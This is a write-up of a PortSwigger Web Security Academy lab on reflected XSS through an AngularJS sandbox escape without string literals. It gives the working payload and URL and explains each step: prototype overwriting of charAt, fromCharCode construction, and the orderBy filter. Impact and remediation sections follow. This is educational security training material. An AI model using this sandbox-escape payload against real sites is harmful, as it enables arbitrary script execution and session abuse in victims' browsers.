# Lab: Reflected XSS with AngularJS Sandbox Escape Without Strings

**Platform:** PortSwigger Web Security Academy  
**Difficulty:** Expert  
**Category:** Cross-Site Scripting (XSS) – AngularJS Sandbox Escape  
**Status:** Solved  
**Tools:** Browser, Burp Suite

## Objective

Exploit a reflected XSS vulnerability in an AngularJS application by escaping its sandbox and executing `alert(1)` without using string literals or the `$eval` function.

## Methodology

1. Examined the application's search functionality and identified that the search parameter was processed by AngularJS.
2. Identified restrictions in the AngularJS environment:
   - The `$eval` function was unavailable.
   - String literals could not be used.
3. Used `toString()` to access the JavaScript `String` constructor without directly writing a string literal.
4. Accessed `String.prototype` and overwrote the `charAt` method.
5. Used the AngularJS `orderBy` filter to evaluate an expression.
6. Used `String.fromCharCode()` to construct the JavaScript payload `x=alert(1)` from character codes.
7. Loaded the crafted URL and confirmed successful JavaScript execution.

## Exploit Payload

```text
?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

Full URL format:

```text
https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

## Technical Analysis

The exploit uses several JavaScript and AngularJS techniques:

**1. Accessing the String constructor**

```javascript
toString().constructor
```

Calling `toString()` creates a string without using quotation marks. Its `constructor` property provides access to the JavaScript `String` constructor.

**2. Overwriting `charAt`**

```javascript
toString().constructor.prototype.charAt = [].join
```

This replaces the `charAt` method on the String prototype with the array `join` method.

AngularJS relies on character-processing behavior when enforcing its expression sandbox. Modifying this method interferes with those checks and enables the sandbox escape.

**3. Constructing JavaScript without strings**

```javascript
toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```

The `fromCharCode()` method converts character codes into a string.

The resulting string is:

```javascript
x=alert(1)
```

**4. Triggering expression evaluation**

```javascript
[1]|orderBy:PAYLOAD
```

The AngularJS `orderBy` filter processes the constructed expression. With the sandbox checks bypassed, the injected JavaScript executes and triggers `alert(1)`.

## Vulnerability

The application uses an AngularJS expression context that can be manipulated through reflected user input.

Although the environment restricts access to `$eval` and prevents the use of string literals, the attacker can abuse JavaScript prototype manipulation and AngularJS expression evaluation to bypass the sandbox.

The vulnerability demonstrates that AngularJS sandbox restrictions are not a reliable security boundary against arbitrary JavaScript execution.

## Impact

Successful exploitation can allow an attacker to execute arbitrary JavaScript in the victim's browser under the vulnerable application's origin.

Potential consequences include:

- Unauthorized actions through the victim's authenticated session.
- Access to sensitive information available to the page.
- Manipulation of application content.
- Further client-side attacks.

## Remediation

- Upgrade to a supported AngularJS alternative or modern framework.
- Never rely on AngularJS sandbox restrictions as a security control.
- Avoid compiling or evaluating untrusted user input as AngularJS expressions.
- Apply context-aware output encoding.
- Use safe DOM manipulation techniques.
- Implement a restrictive Content Security Policy as an additional defense.

## Evidence

- [ ] Screenshot of the crafted URL.
- [ ] Screenshot showing successful JavaScript execution.
- [ ] Screenshot of the vulnerable search functionality.

## Lab Reference

[PortSwigger – AngularJS sandbox escape without strings](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings)
